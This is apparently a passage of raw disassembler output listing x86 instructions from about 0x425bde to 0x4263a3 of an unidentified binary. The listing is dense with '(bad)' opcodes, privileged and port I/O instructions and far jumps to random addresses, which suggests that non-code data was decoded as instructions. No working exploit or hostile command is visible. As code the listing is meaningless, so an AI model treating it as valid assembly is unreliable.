  425bde:	lds    ebp,FWORD PTR [ecx]
  425be0:	mov    DWORD PTR [eax+0x51],ebx
  425be3:	xor    ebp,DWORD PTR [ebx-0x62]
  425be6:	push   ss
  425be7:	outs   dx,BYTE PTR ds:[esi]
  425be8:	mov    ecx,0x28490e53
  425bed:	fwait
  425bee:	loop   0x425c5e
  425bf0:	(bad)  
  425bf1:	loop   0x425c09
  425bf3:	push   0x5eba0117
  425bf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425bf9:	js     0x425ba4
  425bfb:	mov    bh,0xf9
  425bfd:	clc    
  425bfe:	xor    eax,0x539eaa68
  425c03:	jge    0x425b87
  425c05:	(bad)  
  425c07:	ret    
  425c08:	push   0x63
  425c0a:	or     BYTE PTR ss:[ebp+0x4eb388ae],bh
  425c11:	dec    ecx
  425c12:	fs push esi
  425c14:	sub    ebx,ebp
  425c16:	in     eax,0xff
  425c18:	jmp    0x8ced:0x1fb380d9
  425c1f:	lds    ecx,FWORD PTR [esi+eiz*4+0x157c8fd4]
  425c26:	inc    BYTE PTR [edx]
  425c28:	mov    edx,0x615d15b1
  425c2d:	dec    ebp
  425c2e:	cli    
  425c2f:	lods   eax,DWORD PTR ds:[esi]
  425c30:	aad    0x41
  425c32:	call   0x22743d2f
  425c37:	scas   eax,DWORD PTR es:[edi]
  425c38:	cld    
  425c39:	test   al,0x8f
  425c3b:	xchg   esp,eax
  425c3c:	pop    ebx
  425c3d:	call   0x7824f466
  425c42:	(bad)  
  425c43:	jmp    FWORD PTR [ebp-0x14347037]
  425c49:	arpl   WORD PTR [esi+0x4],di
  425c4c:	jb     0x425c9c
  425c4e:	fiadd  DWORD PTR [edi]
  425c50:	ins    DWORD PTR es:[edi],dx
  425c51:	push   edx
  425c52:	jae    0x425c6c
  425c54:	sub    ch,BYTE PTR [esi]
  425c56:	stc    
  425c57:	jnp    0x425c16
  425c59:	mov    ah,0x3f
  425c5b:	and    DWORD PTR [ebx+0x2d7c606],esi
  425c61:	mov    bh,0x94
  425c63:	mov    edi,0x5af9761f
  425c68:	xchg   DWORD PTR [esi+0x1829b463],esp
  425c6e:	xor    BYTE PTR [edx+0x1c68d30d],ah
  425c74:	pop    ds
  425c75:	retf   0xa313
  425c78:	mov    bl,0xa8
  425c7a:	push   esi
  425c7b:	add    esi,DWORD PTR [edx-0x3a]
  425c7e:	ins    BYTE PTR es:[edi],dx
  425c7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425c80:	pop    esp
  425c81:	gs in  eax,dx
  425c83:	sahf   
  425c84:	popa   
  425c85:	dec    eax
  425c86:	push   0x7874bafe
  425c8b:	sbb    dh,BYTE PTR [edi-0x6]
  425c8e:	mov    dl,0x31
  425c90:	imul   ebp,DWORD PTR [edx*2+0x13289d5f],0xffffff84
  425c98:	mov    edi,0xfcb5beac
  425c9d:	inc    ebp
  425c9e:	sbb    al,0x8e
  425ca0:	push   edx
  425ca1:	rol    DWORD PTR [ebp+edx*4+0x35],1
  425ca5:	repz or ah,BYTE PTR [ebx-0x7137dccf]
  425cac:	cld    
  425cad:	and    al,0x8e
  425caf:	jecxz  0x425c46
  425cb1:	(bad)  
  425cb2:	fist   DWORD PTR [ebp-0x65]
  425cb5:	xor    DWORD PTR [eax+0x759ae5a5],edi
  425cbb:	stos   BYTE PTR es:[edi],al
  425cbc:	scas   al,BYTE PTR es:[edi]
  425cbd:	mov    dh,0x82
  425cbf:	dec    ebx
  425cc0:	mov    gs:0x84280cc9,eax
  425cc6:	vpunpcklqdq xmm2,xmm6,XMMWORD PTR [ecx+0x7a]
  425ccb:	or     DWORD PTR [ecx-0x75],edx
  425cce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425ccf:	scas   al,BYTE PTR es:[edi]
  425cd0:	mov    ebp,0xd7b69472
  425cd5:	xor    ah,BYTE PTR [eax+0x537e7b17]
  425cdb:	in     al,dx
  425cdc:	dec    ecx
  425cdd:	into   
  425cde:	in     eax,dx
  425cdf:	jbe    0x425c9e
  425ce1:	lods   al,BYTE PTR ds:[esi]
  425ce2:	(bad)  
  425ce3:	cmp    al,0xcc
  425ce5:	fdivr  QWORD PTR [edi-0x5e7e85f6]
  425ceb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425cec:	cld    
  425ced:	dec    ecx
  425cee:	jmp    0xe4c7:0x2ab3803e
  425cf5:	mov    esi,0xd958329d
  425cfa:	call   DWORD PTR [edx-0x68ecb8d8]
  425d00:	(bad)  
  425d01:	add    ebp,DWORD PTR [edx-0x42]
  425d04:	xchg   ebp,eax
  425d05:	test   BYTE PTR [ebx+edi*4+0x65d7f4c2],al
  425d0c:	or     eax,0x0
	...
  425d19:	add    BYTE PTR [edx-0x79],cl
  425d1c:	push   edx
  425d1d:	dec    esp
  425d1e:	(bad)  
  425d20:	pop    esi
  425d21:	xchg   DWORD PTR [edi-0x6a92def1],ecx
  425d27:	arpl   WORD PTR [ebx],cx
  425d29:	add    eax,0x1d43b
  425d2e:	sti    
  425d2f:	add    DWORD PTR [eax],eax
  425d31:	add    BYTE PTR [ecx-0x35],dl
  425d34:	add    al,BYTE PTR [edx-0x77e250e1]
  425d3a:	xchg   DWORD PTR [ecx-0x55],edi
  425d3d:	call   0x63bbe444
  425d42:	iret   
  425d43:	and    eax,0x4c22a6b8
  425d48:	jp     0x425d92
  425d4a:	mov    bh,0x2e
  425d4c:	sub    DWORD PTR [eax],eax
  425d4e:	jmp    0x425d95
  425d50:	(bad)  
  425d51:	cmp    DWORD PTR [edx],edi
  425d53:	xor    DWORD PTR [edi],esp
  425d55:	arpl   ax,si
  425d57:	sub    BYTE PTR [esi],ah
  425d59:	xlat   BYTE PTR cs:[ebx]
  425d5b:	into   
  425d5c:	cmp    DWORD PTR [eax-0x27],ebx
  425d5f:	arpl   bp,bp
  425d61:	in     eax,dx
  425d62:	out    0x98,eax
  425d64:	mov    bh,0xf
  425d66:	test   esi,eax
  425d68:	test   al,0xcf
  425d6a:	mov    ecx,eax
  425d6c:	test   BYTE PTR [edx+0x22fbf518],dh
  425d72:	xchg   edi,eax
  425d73:	ja     0x425d17
  425d75:	jns    0x425d7e
  425d77:	fidiv  DWORD PTR [ebx-0x38b8f9be]
  425d7d:	push   0xffffff8c
  425d7f:	jno    0x425d9b
  425d81:	add    bh,BYTE PTR [ecx-0x71]
  425d84:	pusha  
  425d85:	mov    cs,WORD PTR [esi]
  425d87:	aam    0xed
  425d89:	push   ecx
  425d8a:	lods   al,BYTE PTR ds:[esi]
  425d8b:	inc    esi
  425d8c:	rol    ebp,cl
  425d8e:	jge    0x425d8e
  425d90:	xchg   esp,eax
  425d91:	or     ecx,edi
  425d93:	into   
  425d94:	dec    eax
  425d95:	dec    ebx
  425d96:	dec    ebp
  425d97:	call   0xcf343a05
  425d9c:	repnz sub al,0x82
  425d9f:	xchg   BYTE PTR [ebx+ebx*8+0x43],bh
  425da3:	or     bh,ah
  425da5:	xchg   esi,eax
  425da6:	(bad)  
  425da7:	and    al,0x75
  425da9:	pop    eax
  425daa:	mov    DWORD PTR ds:0x6972df27,ebp
  425db0:	outs   dx,DWORD PTR ds:[esi]
  425db1:	push   0x6a39b4
  425db6:	mov    al,BYTE PTR [edx]
  425db8:	popf   
  425db9:	repnz fimul DWORD PTR [eax]
  425dbc:	(bad)  
  425dbd:	push   esp
  425dbe:	mov    ebx,0xa718adb1
  425dc3:	fistp  DWORD PTR [ebx+eiz*1-0x3e77f6c9]
  425dca:	add    cl,0x21
  425dcd:	mov    ds:0xb951f37e,eax
  425dd2:	sahf   
  425dd3:	xchg   ebx,eax
  425dd4:	mov    BYTE PTR [eax+0x6b],dh
  425dd7:	test   cl,ah
  425dd9:	pop    ebx
  425dda:	cmp    BYTE PTR [ecx],bh
  425ddc:	stos   BYTE PTR es:[edi],al
  425ddd:	mov    eax,ds:0x42c6f234
  425de2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425de3:	lock dec edx
  425de5:	aas    
  425de6:	out    dx,al
  425de7:	lods   eax,DWORD PTR ds:[esi]
  425de8:	mov    ds:0x8267e803,eax
  425ded:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425dee:	and    eax,esp
  425df0:	pop    esi
  425df1:	gs popf 
  425df3:	jle    0x425df7
  425df5:	fbstp  TBYTE PTR [ecx+0x29]
  425df8:	cmp    eax,0xa1592c38
  425dfd:	outs   dx,BYTE PTR ds:[esi]
  425dfe:	pop    esi
  425dff:	imul   esp,DWORD PTR [ecx],0x4b2c02f7
  425e05:	mov    cl,0x37
  425e07:	cli    
  425e08:	jae    0x425e06
  425e0a:	xor    al,0x99
  425e0c:	imul   edi,ebx,0xb650b12f
  425e12:	call   0x1c551a32
  425e17:	mov    ds,WORD PTR [ebp-0x50]
  425e1a:	lock pop es
  425e1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e1d:	pop    ebp
  425e1e:	mov    al,ds:0xcd685ed7
  425e23:	dec    ebx
  425e24:	and    dh,BYTE PTR [esi+0x66]
  425e27:	xchg   ecx,eax
  425e28:	icebp  
  425e29:	ficomp DWORD PTR [ebp+0x5b68a311]
  425e2f:	push   0x49
  425e31:	bound  ebp,QWORD PTR [ebx+0x50]
  425e34:	xor    eax,0x9800361
  425e39:	pop    ss
  425e3a:	xor    al,0x80
  425e3c:	ss mov ah,0x12
  425e3f:	in     eax,dx
  425e40:	cmp    eax,0xe3859f1d
  425e45:	add    DWORD PTR [edx+eax*4+0x28c4244b],ecx
  425e4c:	fs and al,0x3f
  425e4f:	rcr    DWORD PTR ds:0x29ccc2cc,cl
  425e55:	pop    ebx
  425e56:	push   edx
  425e57:	or     al,BYTE PTR [eax+0x71]
  425e5a:	push   0xffffff91
  425e5c:	push   ebp
  425e5d:	mov    bl,0xd4
  425e5f:	cmp    bh,BYTE PTR [ecx-0x6fe35e57]
  425e65:	mov    bl,0x6f
  425e67:	loopne 0x425e18
  425e69:	stc    
  425e6a:	and    al,0xa0
  425e6c:	iret   
  425e6d:	(bad)  
  425e6f:	fsub   st,st(3)
  425e71:	xor    dh,0xfa
  425e74:	jmp    0x425ed7
  425e76:	fwait
  425e77:	sbb    esi,DWORD PTR [ecx]
  425e79:	hlt    
  425e7a:	cmp    BYTE PTR [esi+0x3a],al
  425e7d:	sub    BYTE PTR [ebx-0x48065c13],0x4d
  425e84:	stc    
  425e85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e87:	adc    eax,0x7b1d2517
  425e8c:	mov    cl,0x4c
  425e8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e8f:	mov    eax,ds:0x5f371e65
  425e94:	pop    es
  425e95:	jmp    0xde86e7b
  425e9a:	mov    WORD PTR [edi+0x6e],?
  425e9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e9e:	out    0x67,al
  425ea0:	adc    al,0x77
  425ea2:	cmp    esi,DWORD PTR gs:[eax-0x2d4c3a7d]
  425ea9:	sbb    DWORD PTR [ebp-0x4b],edi
  425eac:	or     BYTE PTR [edi-0x3dd78abe],0xa4
  425eb3:	arpl   bp,di
  425eb5:	imul   ebx,DWORD PTR [edi-0x11ef04e],0xffffff83
  425ebc:	(bad)  
  425ebd:	mov    ch,0x2a
  425ebf:	cld    
  425ec0:	out    0xa4,al
  425ec2:	cdq    
  425ec3:	dec    ebp
  425ec4:	mov    ds:0x75e0c455,al
  425ec9:	add    edi,DWORD PTR ds:0xcdee6fb0
  425ecf:	cmovl  esi,DWORD PTR [eax]
  425ed2:	pusha  
  425ed3:	add    ebp,DWORD PTR [edx]
  425ed5:	mov    ds:0x3054966c,al
  425eda:	xchg   BYTE PTR [edx-0x2a716a55],ah
  425ee0:	adc    BYTE PTR [edx],cl
  425ee2:	mov    edi,0xf2c5bddf
  425ee7:	push   esp
  425ee8:	(bad)  
  425ee9:	dec    esi
  425eea:	call   0xd5cd:0xdbeff964
  425ef1:	(bad)  [esi+0x76]
  425ef4:	or     al,0xa5
  425ef6:	push   es
  425ef7:	addr16 (bad) 
  425ef9:	push   eax
  425efa:	out    0xd,al
  425efc:	popaw  
  425efe:	sbb    BYTE PTR [ebx+0x3],bl
  425f01:	push   eax
  425f02:	mul    DWORD PTR [ebx]
  425f04:	hlt    
  425f05:	cmp    bh,dh
  425f07:	int    0x92
  425f09:	xchg   edx,eax
  425f0a:	sub    esi,DWORD PTR [edi-0x13]
  425f0d:	xchg   ebx,eax
  425f0e:	push   ds
  425f0f:	leave  
  425f10:	push   0x37
  425f12:	js     0x425ec0
  425f14:	out    dx,al
  425f15:	jbe    0x425f7a
  425f17:	jo     0x425e9b
  425f19:	push   es
  425f1a:	cwde   
  425f1b:	push   edx
  425f1c:	and    BYTE PTR [ecx-0x3ac0f277],bh
  425f22:	cld    
  425f23:	sbb    edi,DWORD PTR [ecx+0x7c2c7cc7]
  425f29:	(bad)  
  425f2a:	aas    
  425f2b:	sub    ebp,DWORD PTR [ebx]
	...
  425f39:	add    BYTE PTR [edx],cl
  425f3b:	xchg   edx,eax
  425f3c:	jl     0x425f77
  425f3e:	cld    
  425f3f:	dec    DWORD PTR [edi-0x4d]
  425f42:	or     DWORD PTR [eax+eax*1],ebp
  425f45:	sub    esi,DWORD PTR [ebp+0x36e240e6]
  425f4b:	(bad)  
  425f4c:	add    DWORD PTR [eax],eax
  425f4e:	sti    
  425f4f:	add    DWORD PTR [eax],eax
  425f51:	add    BYTE PTR [ecx],bh
  425f53:	xchg   ecx,eax
  425f54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425f55:	leave  
  425f56:	push   esp
  425f57:	gs ds inc eax
  425f5a:	loope  0x425f02
  425f5c:	push   esi
  425f5d:	push   edx
  425f5e:	push   ds
  425f5f:	sub    al,0x11
  425f61:	mov    al,0x15
  425f63:	call   0x38005728
  425f68:	leave  
  425f69:	(bad)  
  425f6a:	js     0x425f4f
  425f6c:	rol    BYTE PTR [esi+ecx*8-0x5e7e797],cl
  425f73:	rol    DWORD PTR [edx],cl
  425f75:	bound  ebx,QWORD PTR [ecx+ecx*8+0x75]
  425f79:	rcr    DWORD PTR [edx],cl
  425f7b:	jo     0x425fdf
  425f7d:	jmp    0xf9f7:0xa1ab904c
  425f84:	xor    esp,DWORD PTR [ebx]
  425f86:	sahf   
  425f87:	mov    ds:0x7284971c,al
  425f8c:	jg     0x425f73
  425f8e:	js     0x426009
  425f90:	sbb    esi,DWORD PTR [esi+esi*1-0xff9a9b5]
  425f97:	icebp  
  425f98:	daa    
  425f99:	repz inc eax
  425f9b:	or     DWORD PTR [ebx-0x6175c9c8],ecx
  425fa1:	adc    DWORD PTR [ebx],esp
  425fa3:	xlat   BYTE PTR ds:[ebx]
  425fa4:	add    BYTE PTR [ecx+0x7480bbc8],cl
  425faa:	je     0x425fa6
  425fac:	imul   eax,DWORD PTR ds:0xd962d30f,0x3ae637dc
  425fb6:	btr    DWORD PTR [edi-0x7b],eax
  425fba:	aad    0x9d
  425fbc:	pop    eax
  425fbd:	pop    ebp
  425fbe:	mov    ds:0xe4b846e0,eax
  425fc3:	fisub  DWORD PTR [edi]
  425fc5:	xor    al,0x2c
  425fc7:	cmc    
  425fc8:	pop    edx
  425fc9:	les    edx,FWORD PTR [ebx-0x1]
  425fcc:	xchg   ecx,eax
  425fcd:	ins    BYTE PTR es:[edi],dx
  425fce:	push   edi
  425fcf:	mov    eax,ds:0x1db7bbda
  425fd4:	aas    
  425fd5:	imul   esp,DWORD PTR [esi+ebp*4+0x1c],0xfffffff6
  425fda:	lods   al,BYTE PTR ds:[esi]
  425fdb:	and    BYTE PTR [ebx-0x289ee0a2],al
  425fe1:	cmc    
  425fe2:	mov    esi,0x81b27b3a
  425fe7:	push   eax
  425fe8:	out    dx,eax
  425fe9:	xchg   esp,edi
  425feb:	addr16 dec ebx
  425fed:	jno    0x426066
  425fef:	pop    edx
  425ff0:	(bad)  
  425ff2:	loope  0x425f9a
  425ff4:	xchg   ecx,eax
  425ff5:	pop    es
  425ff6:	xchg   edx,eax
  425ff7:	loop   0x42602e
  425ff9:	lods   al,BYTE PTR ds:[esi]
  425ffa:	mov    dh,0x40
  425ffd:	inc    ecx
  425ffe:	leave  
  425fff:	outs   dx,DWORD PTR ds:[esi]
  426000:	add    eax,0x5db1e671
  426005:	xchg   esp,eax
  426006:	mov    ch,0xd4
  426008:	add    dh,BYTE PTR [ebp+0x77]
  42600b:	outs   dx,BYTE PTR ds:[esi]
  42600c:	pop    es
  42600d:	pushf  
  42600e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42600f:	push   esp
  426010:	sub    eax,0x6e268211
  426015:	and    eax,0xda09fa39
  42601a:	loope  0x426082
  42601c:	daa    
  42601d:	dec    ebp
  42601e:	mov    bh,0xd2
  426020:	pop    edi
  426021:	mov    esp,0x351f171d
  426026:	mov    al,0x46
  426028:	stc    
  426029:	jge    0x42603b
  42602b:	adc    BYTE PTR [ebp-0x704af81b],0xd2
  426032:	sbb    eax,0xfa6464e0
  426037:	repnz mov esi,DWORD PTR ds:0xe92db607
  42603e:	sahf   
  42603f:	fwait
  426040:	mov    dh,0x9f
  426042:	aaa    
  426043:	arpl   WORD PTR [edx+esi*8],bp
  426046:	loopne 0x426094
  426048:	dec    DWORD PTR [ecx+0x3b7458a9]
  42604e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42604f:	das    
  426050:	dec    esi
  426051:	add    al,0x26
  426053:	iret   
  426054:	adc    eax,0x222d653b
  426059:	push   0x31bceafc
  42605e:	xchg   edi,eax
  42605f:	xor    DWORD PTR [esi+0x44],esp
  426062:	push   esi
  426063:	jp     0x426051
  426065:	sub    DWORD PTR [bx-0x583],esp
  42606a:	loop   0x42608c
  42606c:	mov    eax,ds:0xe5787b9d
  426071:	es (bad) 
  426073:	xchg   esp,eax
  426074:	in     eax,dx
  426075:	clc    
  426076:	sbb    ecx,DWORD PTR [ebx-0x38]
  426079:	xlat   BYTE PTR es:[ebx]
  42607b:	ins    BYTE PTR es:[edi],dx
  42607c:	test   al,0xab
  42607e:	ror    cl,cl
  426080:	add    DWORD PTR [edi+0x79],esi
  426083:	pop    ebx
  426084:	mov    ch,0xca
  426086:	adc    al,BYTE PTR [ebx-0xdcfeb99]
  42608c:	gs out 0xdb,al
  42608f:	int    0x3b
  426091:	push   ss
  426092:	call   0x2158:0x9f5e6eb4
  426099:	nop
  42609a:	sub    ah,BYTE PTR [edi+eiz*2+0x13]
  42609e:	mov    al,0xc0
  4260a0:	xchg   edi,eax
  4260a1:	push   edi
  4260a2:	les    esi,FWORD PTR [eax+ecx*1-0x2f]
  4260a6:	sbb    eax,0x513039a1
  4260ab:	test   eax,0x103e7429
  4260b0:	clc    
  4260b1:	jmp    0x6bbd5e0e
  4260b6:	dec    esp
  4260b7:	les    ebp,FWORD PTR [esi]
  4260b9:	push   es
  4260ba:	cmp    bh,BYTE PTR [ecx+edi*1-0x26]
  4260be:	in     eax,0xa
  4260c0:	mov    ebx,0x636cf727
  4260c5:	xchg   bl,cl
  4260c7:	imul   edi,DWORD PTR [edi-0xae75d7c],0xbbdbd2d4
  4260d1:	scas   al,BYTE PTR es:[edi]
  4260d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260d3:	push   es
  4260d4:	sbb    edi,ebx
  4260d6:	stos   DWORD PTR es:[edi],eax
  4260d7:	push   cs
  4260d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4260d9:	imul   ecx,DWORD PTR [edi+0x42b4259e],0x5cdb081
  4260e3:	lods   eax,DWORD PTR ds:[esi]
  4260e4:	lds    ebp,FWORD PTR [esi-0x1c]
  4260e7:	adc    eax,0x15915ce6
  4260ec:	sub    esi,edi
  4260ee:	and    ah,cl
  4260f0:	cwde   
  4260f1:	fwait
  4260f2:	pop    ebx
  4260f3:	retf   0xff8f
  4260f6:	xchg   esp,eax
  4260f7:	sbb    bh,ch
  4260f9:	leave  
  4260fa:	inc    ebp
  4260fb:	adc    DWORD PTR [eax+ebp*8],0xffffffbc
  4260ff:	add    bl,BYTE PTR [ebp+0x4bfb48fb]
  426105:	adc    edx,DWORD PTR [eax]
  426107:	cdq    
  426108:	out    dx,eax
  426109:	mov    ah,0x22
  42610b:	aad    0x13
  42610d:	ins    DWORD PTR es:[edi],dx
  42610e:	scas   eax,DWORD PTR es:[edi]
  42610f:	loopne 0x426166
  426111:	dec    edx
  426112:	cmp    eax,0x4953b9ae
  426117:	mov    bl,0xe6
  426119:	fimul  WORD PTR [eax+eax*1]
  42611c:	pop    edi
  42611d:	loope  0x42619c
  42611f:	mov    esp,0xebb7c269
  426124:	hlt    
  426125:	arpl   sp,bx
  426127:	cmp    BYTE PTR [esp+ebx*1-0x7c],0xd0
  42612c:	push   ecx
  42612d:	add    BYTE PTR [ecx+0x1d],cl
  426130:	nop
  426131:	retf   0x7470
  426134:	clc    
  426135:	jne    0x426128
  426137:	add    BYTE PTR [edi-0x558a753e],0x76
  42613e:	sub    BYTE PTR [ebx+0x19],al
  426141:	lods   al,BYTE PTR ds:[esi]
  426142:	int3   
  426143:	imul   eax,DWORD PTR [eax],0x7f
  426146:	cld    
  426147:	imul   ecx,DWORD PTR [ebx+0x52cf7ccc],0x0
	...
  426159:	add    bl,al
  42615b:	and    ecx,edx
  42615d:	dec    eax
  42615e:	repz clc 
  426160:	fld    TBYTE PTR [ebx-0x2cd29d30]
  426166:	cmp    al,0x63
  426168:	jno    0x426160
  42616a:	xor    eax,ebx
  42616c:	add    DWORD PTR [eax],eax
  42616e:	sti    
  42616f:	add    DWORD PTR [eax],eax
  426171:	add    BYTE PTR [edi],bh
  426173:	in     al,0x7e
  426175:	pop    ds
  426176:	rcr    BYTE PTR [esi+0x7f],1
  426179:	inc    ebx
  42617a:	sub    edi,eax
  42617c:	jmp    0x4261e0
  42617e:	mov    ebp,0xbe7f8602
  426183:	cs push eax
  426185:	or     bl,BYTE PTR [edx]
  426187:	mov    edx,0xc309c1f9
  42618c:	daa    
  42618d:	mov    cl,0x53
  42618f:	mov    ds:0xc55bcf20,eax
  426194:	cli    
  426195:	popf   
  426196:	repnz xlat BYTE PTR ds:[ebx]
  426198:	sub    DWORD PTR [eax-0x1],edx
  42619b:	ret    0x1f7f
  42619e:	jmp    0x426191
  4261a0:	push   es
  4261a1:	mov    ecx,0xa5d54ade
  4261a6:	jmp    0x290f:0x5bf0d173
  4261ad:	popf   
  4261ae:	mov    ecx,0x3780f8ff
  4261b3:	mov    ecx,0x27f4f828
  4261b8:	jmp    0x42615a
  4261ba:	mov    bl,0xdf
  4261bc:	gs stc 
  4261be:	stc    
  4261bf:	pop    ss
  4261c0:	test   BYTE PTR [esi-0x73],dl
  4261c3:	fsubr  QWORD PTR [ebx+0x44]
  4261c6:	xlat   BYTE PTR ds:[ebx]
  4261c7:	xchg   edi,eax
  4261c8:	ss pop ecx
  4261ca:	daa    
  4261cb:	popa   
  4261cc:	dec    ecx
  4261cd:	out    0x70,eax
  4261cf:	cs jecxz 0x4261fb
  4261d2:	data16 loopne 0x42621a
  4261d5:	cmp    bh,BYTE PTR [ebx+eax*4]
  4261d8:	repnz out 0xf3,al
  4261db:	sub    BYTE PTR [ecx+eax*2-0x1a646297],al
  4261e2:	in     eax,dx
  4261e3:	sub    bh,bl
  4261e5:	mov    ch,0x77
  4261e7:	sbb    eax,0xc9be9ecc
  4261ec:	sbb    ecx,edi
  4261ee:	pop    ds
  4261ef:	in     eax,dx
  4261f0:	jp     0x4261d0
  4261f2:	stc    
  4261f3:	js     0x426226
  4261f5:	ret    0x2733
  4261f8:	pop    es
  4261f9:	inc    edx
  4261fa:	dec    edx
  4261fb:	add    BYTE PTR [edi+0x39],0xa
  4261ff:	bound  esi,QWORD PTR [esi-0x4e]
  426202:	push   0xfb8886ab
  426207:	adc    eax,0x228f779e
  42620c:	out    dx,eax
  42620d:	sub    al,0xb0
  42620f:	test   edx,0xfd070b6e
  426215:	xor    al,0xf7
  426217:	outs   dx,DWORD PTR ds:[esi]
  426218:	pop    ecx
  426219:	js     0x4261f6
  42621b:	lock shl BYTE PTR [ebx-0x32986dba],1
  426222:	add    eax,0x81231b2b
  426227:	call   0x2d21:0xda93a3f8
  42622e:	push   ebx
  42622f:	in     eax,0x40
  426231:	fwait
  426232:	and    al,0xf5
  426234:	jmp    0xef967335
  426239:	stos   BYTE PTR es:[edi],al
  42623a:	(bad)  
  42623c:	mov    ebp,0x1c7e71c6
  426241:	adc    dh,BYTE PTR [ecx-0x38]
  426244:	xchg   esi,eax
  426245:	mov    dh,0xdc
  426247:	je     0x4262c2
  426249:	jb     0x42621d
  42624b:	fsub   QWORD PTR [ecx]
  42624d:	dec    esp
  42624e:	push   cs
  42624f:	pop    ds
  426250:	lods   eax,DWORD PTR ds:[esi]
  426251:	pop    edi
  426252:	push   ebx
  426253:	dec    ebx
  426254:	pop    ebp
  426255:	and    bh,ah
  426257:	sbb    eax,0xc8b14330
  42625c:	les    ebp,FWORD PTR [ebp-0x6d]
  42625f:	fst    DWORD PTR [ebp-0x4c]
  426262:	pop    edx
  426263:	rol    eax,1
  426265:	jmp    0x426269
  426267:	sahf   
  426268:	jbe    0x426203
  42626a:	add    ecx,DWORD PTR [eax]
  42626c:	sbb    al,0xe9
  42626e:	fdivr  QWORD PTR [ebx+0x59365ff]
  426274:	test   BYTE PTR [esi-0x720c0956],ah
  42627a:	lea    ebp,[edi+edx*1-0x79e7b599]
  426281:	sar    BYTE PTR [eax+ebp*8+0x7f857530],cl
  426288:	and    bl,BYTE PTR fs:[ebp+0x31]
  42628c:	(bad)  
  42628d:	jbe    0x426252
  42628f:	ds pop esp
  426291:	mov    edx,0xbf9feb5e
  426296:	jmp    0x4262e0
  426298:	std    
  426299:	jmp    0xe1c3f1e4
  42629e:	push   es
  42629f:	adc    al,0xfc
  4262a1:	ret    
  4262a2:	mov    ds:0x7a9b0981,eax
  4262a7:	xchg   edx,eax
  4262a8:	adc    al,0xac
  4262aa:	sub    dh,BYTE PTR [ecx+edi*2+0x45]
  4262ae:	jge    0x42632b
  4262b0:	pop    ss
  4262b1:	into   
  4262b2:	ins    BYTE PTR es:[edi],dx
  4262b3:	dec    DWORD PTR [edx-0x67]
  4262b6:	mov    al,0xc4
  4262b8:	enter  0x5660,0xe0
  4262bc:	int    0x5f
  4262be:	xchg   ebp,eax
  4262bf:	push   edx
  4262c0:	mov    bh,BYTE PTR [ecx+ecx*1]
  4262c3:	ss inc esi
  4262c5:	ja     0x426344
  4262c7:	ds inc esp
  4262c9:	dec    ebx
  4262ca:	div    BYTE PTR [edi-0x2394d250]
  4262d0:	imul   ecx,ebp,0x449726fa
  4262d6:	jl     0x67bb426b
  4262dc:	ja     0x4262b3
  4262de:	popf   
  4262df:	inc    eax
  4262e0:	lds    esp,FWORD PTR [ecx+0x6e8b400f]
  4262e6:	jmp    FWORD PTR [esi+ecx*2-0x5c309893]
  4262ed:	pop    ecx
  4262ee:	ret    0xe1aa
  4262f1:	outs   dx,BYTE PTR ds:[esi]
  4262f2:	enter  0xac32,0x1
  4262f6:	shl    DWORD PTR [esi+0x69],0x4b
  4262fa:	sub    BYTE PTR [ebx],bl
  4262fc:	push   esp
  4262fd:	call   0x5b2a9a4
  426302:	pop    ebx
  426303:	pop    eax
  426304:	lods   al,BYTE PTR ds:[esi]
  426305:	jbe    0x4262db
  426307:	sbb    esp,DWORD PTR [ebx]
  426309:	lahf   
  42630a:	xor    eax,DWORD PTR [ebx]
  42630c:	test   al,0xd
  42630e:	mov    bh,0xaf
  426310:	out    0xf2,al
  426312:	pop    ebp
  426313:	dec    esp
  426314:	push   edi
  426315:	push   esp
  426316:	test   DWORD PTR [esp+edx*8+0x7adcfd9f],ecx
  42631d:	cdq    
  42631e:	lea    eax,[eax]
  426320:	out    dx,eax
  426321:	js     0x426326
  426323:	add    bl,ch
  426325:	fwait
  426326:	cmp    esp,DWORD PTR [eax-0x7d]
  426329:	jns    0x42637b
  42632b:	jmp    0x426374
  42632d:	mov    esp,0x7c5f4b88
  426332:	adc    cl,al
  426334:	sbb    dl,BYTE PTR [eax+0x4d]
  426337:	or     eax,0xb85977c7
  42633c:	jle    0x4262e0
  42633e:	loope  0x4262cc
  426340:	lea    edi,[edx+0x4937f736]
  426346:	mov    esp,0x880b5dd5
  42634b:	fwait
  42634c:	mov    DWORD PTR [edx],esp
  42634e:	inc    edi
  42634f:	mov    ebp,DWORD PTR [esi+0x79]
  426352:	push   ebx
  426353:	cmp    dh,BYTE PTR [ecx-0x71]
  426356:	(bad)  
  426357:	aaa    
  426358:	push   edx
  426359:	(bad)  
  42635a:	sub    al,0x2e
  42635c:	sbb    DWORD PTR [ebx+eax*1-0x2be01f30],0x65
  426364:	push   edx
  426365:	outs   dx,BYTE PTR ds:[esi]
  426366:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426367:	fldenv [esi+0x7d]
  42636a:	or     ebx,ecx
  42636c:	push   ebx
	...
  426379:	add    BYTE PTR [edx-0x101610a7],bl
  42637f:	call   FWORD PTR [esi-0x71a9f385]
  426385:	rcl    ecx,cl
  426387:	(bad)
  42638a:	sub    al,0xda
  42638c:	add    DWORD PTR [eax],eax
  42638e:	sti    
  42638f:	add    DWORD PTR [eax],eax
  426391:	add    BYTE PTR [eax],dl
  426393:	sbb    eax,0x61abbff
  426398:	repz out dx,al
  42639a:	mov    ch,0x99
  42639c:	adc    DWORD PTR [edi+ebp*2-0x39],eax
  4263a0:	dec    ebx
  4263a1:	push   ebx
  4263a2:	(bad)  
  4263a3:	push   ebp
